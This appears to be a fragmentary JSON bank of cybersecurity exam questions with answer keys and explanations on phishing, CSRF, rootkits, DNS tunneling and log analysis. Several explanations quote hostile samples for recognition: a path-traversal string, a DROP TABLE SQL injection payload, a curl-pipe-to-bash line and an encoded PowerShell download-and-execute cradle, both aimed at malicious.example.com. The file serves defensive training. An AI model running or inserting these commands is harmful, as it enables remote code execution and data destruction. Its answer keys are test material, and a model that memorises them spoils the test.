  ...
  "questions": [
{
 ...
 "options":[
   ...
   "correctAnswerIndex": 2,
    "explanation":
       "The key to understanding this question is realizing it's asking about the command run on the *attacker's machine*, not the compromised server.  A reverse shell requires a *listener* on the attacker's side.
...
},
{
 ...
 "explanation":
  "This is not XSS (which involves injecting scripts), SQL injection (which manipulates database queries), or CSRF (which forces authenticated users to perform actions). The input `../../../../etc/passwd` is a classic example of a *directory traversal* (also known as path traversal) attack. The attacker is using the `../` sequence to navigate *up* the directory structure, *outside* the intended directory (presumably the webroot), and attempt to access a sensitive system file (`/etc/passwd`). The *most effective* way to prevent directory traversal is a combination of:
 ...
 *   **Strict Input Validation:**  *Thoroughly* validate the user-provided filename *before* using it to access any files. This validation should:
  *   Reject any input containing `../`, `./`, `\`, or other potentially dangerous characters or sequences.
     ...
     *  Normalize the file path before checking against whitelist
...
"correctAnswerIndex": 1,
 "explanation":
   "`ip.src == client_ip && tcp.port == 80` would show all traffic *from* the client on port 80 (likely HTTP), but doesn't consider data size. `ip.dst == client_ip` would show traffic *to* the client, not *from* it. `tcp.flags.push == 1` shows packets with the PUSH flag set, which can indicate data transfer, but doesn't filter by size or direction. The best option is `ip.src == client_ip && tcp.len > 1000`. This filter does the following:
    ...
    * `&&` is a condition that the previous two must be true for the traffic to be displayed
...
},
{
  ...
  "correctAnswerIndex": 1,
   "explanation":
 "This is not XSS (which involves injecting scripts into a legitimate website), DoS (which aims to disrupt service), or SQL injection (which targets databases). This is a classic description of a *phishing* attack. The user was tricked into visiting a *fake website* that mimicked their bank's login page, and they entered their credentials. The attacker now likely has their username and password. The *highest priority immediate actions* are:
...
},
{
 ...
 "correctAnswerIndex": 1,
"explanation":
    "Executing malware is *dynamic analysis*. Encryption is not the goal of static analysis. Hash comparison is signature-based detection, a *part* of static analysis, but not the whole picture. *Static analysis* involves examining a suspected malware file *without executing it*. This includes:
...
"options":[
  ...
  "Implementing strong password policies, account lockouts after a limited number of failed login attempts, and multi-factor authentication (MFA).",
   ...
   "correctAnswerIndex": 1,
  "explanation":
    "Encryption protects data in transit, but doesn't prevent password guessing. Penetration testing *identifies* vulnerabilities. A WAF primarily protects web applications. The *most effective* defense against brute-force attacks (where an attacker systematically tries many password combinations) is a *combination* of:
...
"question": "You are investigating a security incident and need to determine the *order* in which events occurred across *multiple systems* (servers, workstations, network devices). What is the ABSOLUTE MOST critical requirement for accurately correlating these events and reconstructing the timeline of the incident?",
 ...
 "correctAnswerIndex": 1,
"explanation":
     "Source code access, user account lists, and consistent logging formats are *helpful*, but not the *most critical* factor for *timing*. *Accurate and synchronized time* across *all* relevant systems and devices is *absolutely essential* for correlating events during incident investigations. Without synchronized clocks (using a protocol like NTP – Network Time Protocol), it becomes extremely difficult (or impossible) to determine the correct sequence of events when analyzing logs from multiple, disparate sources. A time difference of even a few seconds can completely distort the timeline of an attack and make it impossible to determine cause and effect.",
...
"Conducting regular security awareness training for developers."
  ...
  "correctAnswerIndex": 1,
"explanation":
    "Strong passwords are important generally, but don't *directly* prevent CSRF. HTTPS protects data *in transit*, but not the forged request itself. Developer training is important, but it's not a technical control that directly prevents the attack. The most effective defense against CSRF is a *combination* of:
...
"correctAnswerIndex": 1,
  ...
  *   **Investigate Destination IPs/Domains:** Research the external IP addresses and domains using threat intelligence feeds, WHOIS lookups, and reputation services to determine if they are associated with known malicious activity.
     *   **Analyze Process Behavior:** Examine the process's behavior on the server (file system activity, registry changes, etc.) to understand its purpose.
       *   **Decrypt and Inspect Traffic (If Possible and Authorized):** If legally and technically feasible, decrypt the HTTPS traffic (using a man-in-the-middle proxy or other decryption techniques, *with appropriate authorization*) to examine the actual content of the communication. This can provide definitive proof of malicious activity.",
...
},
{
 ...
 "correctAnswerIndex": 1,
 "explanation":
   "Standard commands like `ps` and `netstat` can be *subverted* by a kernel-mode rootkit, making them unreliable for detection. Examining `/etc/passwd` and `/etc/shadow` is important, but rootkits can hide modifications. Startup scripts can be modified, but kernel-mode rootkits operate at a *deeper level*. Kernel-mode rootkits modify the operating system's kernel (the core of the OS) to hide their presence and the presence of other malware. This makes them very difficult to detect using standard system tools. The *most reliable* detection methods involve:
     *  **Specialized Rootkit Detectors:** These tools use various techniques (signature scanning, integrity checking, behavior analysis, and *kernel memory analysis*) to identify known and unknown rootkits. They often operate *outside* the potentially compromised operating system (e.g., from a bootable CD or USB drive).
    *   **Memory Forensics Toolkits:** (e.g., Volatility) These tools allow you to analyze a *memory dump* (a snapshot of the system's RAM) of the potentially compromised system. By examining the memory directly, you can bypass the potentially compromised operating system and identify hidden processes, kernel modules, and other signs of rootkit activity.

    These techniques provide a more reliable and accurate view of the system's state than relying solely on standard system utilities.",
...
"correctAnswerIndex": 1,
"explanation":
 "Strong passwords help generally, , but session hijacking often bypasses passwords. Awareness training is important, but not a direct technical control. A WAF can help, but it's not the *most* effective single measure. *Session hijacking* occurs when an attacker steals a user's *session ID* (a unique identifier that represents an active session with a web application) and uses it to impersonate the user, gaining access to their account *without* needing their password. The *most effective* prevention combines several techniques, but the *core* defense is using HTTPS and setting specific cookie attributes:
        *   **HTTPS (SSL/TLS):** Encrypting all communication between the client and the server prevents attackers from sniffing network traffic and stealing session IDs.
       *   **Secure Flag:** Setting the `Secure` flag on session cookies ensures that the cookie is *only* transmitted over HTTPS connections, preventing it from being sent in cleartext over HTTP.
         *   **HttpOnly Flag:** Setting the `HttpOnly` flag on session cookies prevents client-side JavaScript from accessing the cookie, mitigating the risk of XSS attacks stealing the session ID.
 * **Session Timeouts**: invalidating sessions after time is a good supporting practice.
 * **Regenerate Session ID**: Do this after any privilege level change.
  * **Bind Session to Other Properties**: You can further enhance security by binding the session ID to more properties, to make sure even is intercepted it wont be easy to compromise.",
...
"options":[
 ...
 "correctAnswerIndex": 1,
 "explanation":
  "System boot logs show startup information. Firewall logs show network traffic, but not *detailed query information*. Antivirus logs show malware detections. The *most direct* evidence of SQL injection attacks would be found in the *database query logs*, *if* they are enabled. These logs record the SQL queries that are executed against the database, and would show any malicious SQL code injected by an attacker. However, query logging can impact performance, so it's not always enabled. *Web server access logs* can also provide clues, as they record the URLs and parameters used in requests to the web application. If the SQL injection is performed through a web application, the attacker's injected code might be visible in the URL parameters within the access logs. Therefore, both are helpful, but query logs directly.",
...
},
{
 ...
 "Clickjacking means the application is vulnerable to denial-of-service (DoS) attacks; it can be mitigated by using rate limiting."
  ...
  "correctAnswerIndex": 1,
 "explanation":
    "Clickjacking is not SQL injection, XSS, or DoS. *Clickjacking* (also known as a 'UI redressing attack') is an attack where a user is tricked into clicking something different from what they *think* they are clicking. The attacker typically does this by:
   *   Embedding the target website in an invisible `<iframe>` on a malicious website.
     *  Positioning the invisible `<iframe>` so that a seemingly harmless element on the malicious page (e.g., a button, a link) is *directly over* a sensitive element on the target website (e.g., a 'Delete Account' button, a 'Transfer Funds' button).
     *    Using CSS to make the `<iframe>` transparent, so the user only sees the elements on the malicious page.

 When the user clicks on the seemingly harmless element, they are *actually* clicking on the hidden element within the `<iframe>`, performing an action on the target website without their knowledge or consent. The *most effective* way to mitigate clickjacking is to use the `X-Frame-Options` HTTP response header. This header tells the browser whether or not it should be allowed to render a page within an `<iframe>`, `<frame>`, or `<object>`. The header can have one of three values:
        *    `DENY`: Prevents the page from being rendered within *any* frame.
    *   `SAMEORIGIN`: Allows the page to be rendered within a frame *only if* the frame's origin is the same as the page's origin.
      *    `ALLOW-FROM uri`: Allows the page to be rendered within a frame *only if* the frame's origin matches the specified URI (less commonly used and not supported by all browsers).",
...
"options":[
 ...
 "It downloads a shell script from a remote server and immediately executes it with root privileges; it is a high security risk.",
  ...
  "It creates a backup of the user's shell configuration; it is not inherently malicious."
     ...
     "correctAnswerIndex": 1,
    "explanation":
       "This command is *not* displaying a file, checking for updates, or creating backups. This command is *extremely dangerous*. It uses `curl` to download a shell script from a remote server and *immediately* executes it using the pipe (`|`) to `bash`. Let's break it down:
    *    `curl`: A command-line tool for transferring data with URLs.
    * `-s`: Silent mode (suppresses progress output).
    * `http://malicious.example.com/script.sh`: The URL of the remote shell script (likely malicious).
     *   `|`: The pipe operator. It takes the output of the command on the left (the downloaded script) and passes it as input to the command on the right (`bash`).
     * `bash`: The Bash shell interpreter.

 This means the command downloads a shell script from a (likely malicious) URL and *immediately executes it* with the privileges of the current user. This gives the attacker a direct way to run arbitrary commands on the compromised system.  This is a very common technique used by attackers to install malware, establish backdoors, or perform other malicious actions.",
   "examTip": "Commands that download and execute remote scripts (especially using pipes to `bash` or `sh`) are extremely dangerous."
},
{
    "id": 25,
...
"correctAnswerIndex": 1,
   "explanation":
"ISP or website issues wouldn't cause *consistent* redirects to *unwanted* sites. While an outdated browser is a security risk, it wouldn't be the *most likely* cause of this specific behavior. The most likely cause is either:
...
"options":[
 ...
 "correctAnswerIndex": 1,
 "explanation":
   "`ls -l` provides file listing information, *including* the last modification time, but it shows other details as well and isn't the *most focused* command. `file` determines the file *type*. `strings` extracts printable strings from the file. The `stat` command is specifically designed to display detailed *status information* about a file or filesystem. This includes:
...
"correctAnswerIndex": 1,
"explanation":
The input contains SQL code, not JavaScript (XSS). DoS aims to disrupt service, not manipulate data. Directory traversal uses ../ sequences. This is a classic example of a SQL injection attack. The attacker is injecting SQL code into the user input field. Let's break down the payload:
...
"correctAnswerIndex": 1,
"explanation":
"ps aux shows running processes, but not their network connections. top provides a dynamic view of resource usage, but not detailed network port information. lsof -i lists open files, including network sockets, but is less directly focused on listening ports with process information than netstat or ss. netstat -tulnp (or its modern equivalent, ss -tulpn) is specifically designed to display network connection information. The options provide:
...
"correctAnswerIndex": 1,
"explanation":
"Cryptojacking is not physical theft, a specific type of phishing, or ransomware (although ransomware might demand cryptocurrency). Cryptojacking is a type of cyberattack where a malicious actor secretly uses someone else's computer, server, mobile device, or other computing resources to mine cryptocurrency without their knowledge or consent. The attacker installs malware or uses malicious JavaScript code in websites to hijack the victim's processing power (CPU and/or GPU) for their own financial gain. This can significantly slow down the victim's system, increase electricity costs, and potentially cause hardware damage.",
...
},
{
 ...
 "A cross-site request forgery (CSRF) attack; the user should change their email password."
    ...
    "correctAnswerIndex": 1,
   "explanation":
   "This is not SQL injection (which targets databases), DoS (which disrupts service), or CSRF (which exploits authenticated sessions). Clicking on a malicious link can lead to several threats:
...
},
{
 ...
 "ls -l",
  ...
  "correctAnswerIndex": 1,
"explanation":
   "`ls -l` lists files, but doesn't filter by creation time efficiently. `grep -r` searches for text *within* files. `du -h` shows disk usage. The `find` command is a powerful tool for locating files based on various criteria. The command `find / -type f -ctime -1` does the following:
...
},
{
 ...
 "options":[
  ...
  "correctAnswerIndex": 1,
  "explanation":
"While HTTPS is important for overall security, it doesn't *directly* prevent this vulnerability. Strong passwords are not directly relevant to this file upload issue. Anti-CSRF tokens prevent a different type of attack. The *core security failure* is a combination of:
...
},
{
 ...
 "correctAnswerIndex": 1,
 "explanation":
     "`ps aux` lists running processes, but doesn't show network connection information. `top` displays dynamic resource usage, but not network port details. `lsof -i` lists open files, *including* network sockets, but is less directly focused on *listening* ports than `netstat` or `ss`. `netstat -tulnp` (or its modern equivalent, `ss -tulpn`) is specifically designed to display network connection information. The options provide:
     *    `-t`: Show TCP ports.
   *    `-u`: Show UDP ports.
   * `-l`: Show only *listening* sockets (ports that are actively waiting for incoming connections).
...
},
{
 ...
 "correctAnswerIndex": 1,
 "explanation":
 "SOAR *augments* and *supports* human analysts, it doesn't replace them. No tool can guarantee *complete* prevention of *all* attacks. SOAR can be beneficial for organizations of various sizes, though the specific implementation may vary. SOAR platforms are designed to improve the efficiency and effectiveness of security operations teams by:
...
"question": "What is the primary purpose of 'fuzzing' in software security testing?",
 "options":[
   ...
   "correctAnswerIndex": 1,
    "explanation":
"Fuzzing is *not* encryption, password generation, or code review (though code review is *very* important). Fuzzing (or fuzz testing) is a *dynamic testing technique* used to discover software vulnerabilities and bugs. It involves providing *invalid, unexpected, malformed, or random data* (often called 'fuzz') as *input* to a program or application. The fuzzer then *monitors the program* for crashes, errors, exceptions, memory leaks, or other unexpected behavior. These issues can indicate vulnerabilities that could be exploited by attackers, such as:
   *  Buffer overflows
...
},
{
 ...
 "A cross-site scripting (XSS) attack; the user should reply to the email and ask for clarification from the sender."
     ...
     "correctAnswerIndex": 1,
    "explanation":
 "Legitimate services *rarely* (if ever) request account verification via email links in this manner, especially with grammatical errors. This is *not* a DoS or XSS attack. The scenario describes a classic *phishing* attack. The attacker is impersonating a legitimate online service to trick the user into revealing their account credentials or other sensitive information. The *grammatical errors* and the *different URL* (when hovering over the link) are strong indicators of a phishing attempt. The *best course of action* for the user is to:
   *   *Not click the link* in the email.
 *  *Report the email* as phishing (to their email provider and potentially to the impersonated service).
  *    *Verify their account status (if concerned)* by going *directly* to the service's *official website* (typing the address manually or using a trusted bookmark, *not* clicking any links in the email). If necessary, they can contact the service's customer support through official channels (not through any contact information provided in the email).",
   "examTip": "Be extremely cautious of emails with urgent requests, suspicious links, grammatical errors, and sender addresses that don't match the official domain."
},
{
    "id": 55,
...
},
{
  ...
  "options":[
    ...
    "correctAnswerIndex": 1,
   "explanation":
  "`ps aux` lists running *processes*, but doesn't show network connection details. `top` shows dynamic resource usage, not detailed network information. `lsof -i` lists open files, *including* network sockets, but is less directly focused on established TCP connections with complete process details than `ss`. The `ss` command is the modern replacement for `netstat` and offers more detailed and reliable information. The best option, `ss -t state established -p`, breaks down as follows:
       *   `-t`: Show only TCP connections.
...
},
{
 ...
 "correctAnswerIndex": 1,
   "explanation":
  "This is not XSS (which involves injecting scripts into websites), DoS (which aims to disrupt service), or SQL injection (which targets databases). This scenario describes a *technical support scam*. These scams often involve unsolicited emails, phone calls, or pop-up messages claiming that the user's computer has a virus or other problem. The scammers *impersonate* legitimate technical support personnel and try to convince the user to:
 ...
 *  **Linux:** Use `netstat -tulnp` (or its modern equivalent, `ss -tulpn`). These commands show network connections, listening ports, and, crucially, the *process ID (PID)* and *program name* associated with each connection. You can then use `ps` or other tools to further investigate the identified process.
 ...
 The key is to identify the *specific process* responsible for the unusual network traffic, and then investigate that process further (its purpose, its executable file, its loaded modules, etc.) to determine if it's malicious.",
   "examTip": "Use `netstat`/`ss` (Linux) or Resource Monitor (Windows) to identify processes responsible for network connections."
},
{
  "id": 65,
...
"correctAnswerIndex": 1,
"explanation":
    "SYN packets to port 80 suggest a web connection or a SYN flood. ICMP echo requests are pings. Encrypted HTTPS traffic is normal, though it *could* conceal malicious activity. *DNS tunneling* is a technique used by attackers to *bypass firewalls and security measures* by encoding data from other protocols (e.g., SSH, HTTP) *within DNS queries and responses*. Since DNS traffic (port 53) is often allowed through firewalls, attackers can use it as a covert channel for communication and data exfiltration. Indicators of DNS tunneling include:
   ...
   * **Encoded data in hostnames or subdomains:** Attackers might encode data within the hostname or subdomain fields of DNS queries. For example, a query for `base64encodeddata.example.com` might contain Base64-encoded data.
    *   **High frequency of DNS requests:** A large number of DNS requests to a specific domain, especially from a system that doesn't normally generate much DNS traffic, can be suspicious.
      *   **Communication with unusual or unknown DNS servers:** If a system is making DNS requests to servers other than the configured DNS servers, it could indicate DNS tunneling.",
...
},
{
  ...
  "options": [
   ...
   "correctAnswerIndex": 1,
   "explanation":
  "SOAR *augments* human analysts; it doesn't replace them. No system can guarantee *complete* protection. SOAR focuses on *security* operations, not general IT management. SOAR platforms are designed to improve the efficiency and effectiveness of security operations teams (SOCs) by:
      *   **Automating** repetitive and time-consuming tasks (e.g., alert triage, log analysis, threat intelligence enrichment, basic incident response steps).
...
},
{
 ...
 "correctAnswerIndex": 1,
 "explanation":
"`ps aux` lists running *processes*, but doesn't show network connection details. `top` shows dynamic resource usage, not network port bindings. `lsof -i` lists open files, *including* network sockets, but is less directly focused on *listening* ports and associated process information than `netstat` or `ss`.
...
"correctAnswerIndex": 1,
   "explanation":
    "Limiting file size and using a *single* antivirus engine are insufficient. Renaming to `.txt` is easily bypassed. Encryption protects data, but doesn't prevent execution if misconfigured. The *most comprehensive* approach involves multiple layers of defense:
...
},
{
 ...
 "A SQL injection attack; the user should scan their computer for malware."
    ...
    "correctAnswerIndex": 1,
  "explanation":
    "This is not XSS (which involves injecting scripts into a legitimate website), DoS (which aims to disrupt service), or SQL injection (which targets databases). This scenario describes a classic *phishing* attack. The attacker is impersonating a legitimate online service to trick the user into visiting a *fake website* that mimics the real service's login page. This fake site is designed to steal the user's login credentials (username and password) or other sensitive information. If the user enters their credentials on the phishing site, the attacker will have them. The *highest priority actions* are:
...
},
{
 ...
 "They are usually motivated by causing widespread disruption and damage rather than financial gain or espionage."
   ...
   "correctAnswerIndex": 1,
    "explanation":
   "APTs are *not* short-lived or opportunistic, and they are *not* easily detected by basic security measures. While disruption *can* be a goal, it's not the defining characteristic. APTs are characterized by their:
...
"options":[
 "cat",
  ...
  "ls -l"
    ...
    "correctAnswerIndex": 1,
"explanation":
 " `cat` displays the *contents* of files, but doesn't search efficiently. `find` is primarily for locating files based on attributes (name, size, modification time), not for searching *within* files. `ls -l` lists file details (permissions, owner, size, date), but doesn't search file contents. The `grep` command is specifically designed for searching text within files. The best options are:
...
"examTip": "Stored XSS vulnerabilities allow attackers to inject malicious scripts that are permanently stored on the server and executed by other users."
},
{
"id": 81,
...
"correctAnswerIndex": 1,
"explanation":
"Fuzzing is not encryption, password creation, or code review (though code review is very important). Fuzzing (or fuzz testing) is a dynamic testing technique used to discover software vulnerabilities and bugs. It works by providing a program or application with invalid, unexpected, malformed, or random data (often called 'fuzz') as input. The fuzzer then monitors the program for:
* Crashes
* Errors
* Exceptions
...
"correctAnswerIndex": 1,
"explanation":
"Sandboxing is not encryption, backup, or deletion. A sandbox is a virtualized, isolated environment that is separate from the host operating system and network. It's used to safely execute and analyze potentially malicious files or code (e.g., suspicious email attachments, downloaded files, unknown executables) without risking harm to the production environment. The sandbox monitors the code's behavior:
* What files it creates or modifies.
...
"correctAnswerIndex": 1,
"explanation":
"Strong passwords are important for general security, but don't directly prevent CSRF. HTTPS protects data in transit, but not the forged request itself. Awareness training is valuable, but not the primary technical control. The most effective defense against CSRF is a combination of:
...
{
"id": 88,
"question": "You are investigating a suspected compromise on a Windows system. You believe that malware may have established persistence by creating a new service. Which of the following tools or commands would be MOST useful for examining the configured Windows services and identifying any suspicious or unfamiliar ones?",
"options":[
"Task Manager",
...
"correctAnswerIndex": 1,
"explanation":
"The injected code is JavaScript, not SQL. DoS aims to disrupt service, not inject code. Directory traversal attempts to access files outside the web root. This scenario describes a stored (persistent) cross-site scripting (XSS) vulnerability. Here's why:
...
"examTip": "Stored XSS involves injecting malicious scripts that are saved on the server and later executed by other users' browsers; input validation and context-aware output encoding are crucial defenses."
},
...
"correctAnswerIndex": 1,
  "explanation":
   "The input contains SQL code, not JavaScript (XSS). DoS aims to disrupt service, not manipulate data. Directory traversal uses `../` sequences. This is a classic example of a *SQL injection* attack. The attacker is attempting to inject malicious SQL code into the web application's search functionality. The specific payload (`'; DROP TABLE products; --`) is designed to:
...
Command:
`powershell -NoP -NonI -W Hidden -Exec Bypass -Enc `
...
"It is creating a new user account on the system; it is a moderate security risk.",
 ...
 "correctAnswerIndex": 1,
 "explanation":
"This PowerShell command is *not* checking for updates, creating users, or encrypting files. This is a *highly malicious* and *obfuscated* PowerShell command, a common technique used by attackers. It downloads and executes a remote PowerShell script. Here is the breakdown of the command:
...
The decoded command:
 1.  Creates a .NET `WebClient` object to download content from the web.
   2.  Sets a custom `User-Agent` string in the HTTP request headers. This is often done to masquerade as a legitimate browser or to identify the compromised system as part of a botnet.
3.  *Downloads* the contents of the URL `https://malicious.example.com/script.ps1` as a string. This URL likely points to a malicious PowerShell script.
     4.  Pipes (`|`) the downloaded script content to `IEX` (Invoke-Expression), which *immediately executes* the script.

This command is a *major security risk* because it downloads and executes *arbitrary code* from a remote server, bypassing standard security restrictions. The downloaded script could contain any type of malware, leading to data theft, system compromise, or further propagation of the attack.",
"examTip": "Be extremely cautious of PowerShell commands that use `-EncodedCommand` and download/execute content from external sources. Decode and analyze them carefully."
},
{
"id": 94,
...
},
{
 ...
 "tcp.port == 53"
    ...
    "correctAnswerIndex": 2,
    "explanation":
  "`dns` will show *all* DNS traffic, which will include a lot of legitimate traffic, making it difficult to identify the tunneling activity. `dns && !(ip.addr == dns_server_ip)` shows traffic that is NOT to/from a known good dns server. `tcp.port == 53` shows all traffic using port 53. While DNS *primarily* uses UDP, it can also use TCP, especially for larger responses; filtering only for TCP would miss some tunneling activity.
...
},
{
 "id": 100,
  ...
  "The user's internet connection is too slow to load the website; they should upgrade their internet service."
   ...
   "correctAnswerIndex": 1,
   "explanation":
      "If the website were down, it would affect *all* users, not just one. Browser compatibility is unlikely to cause a *DNS resolution* failure. Slow internet would likely result in slow loading, not a complete inability to resolve the domain name. The most likely cause is a problem with the user's *DNS resolution*:
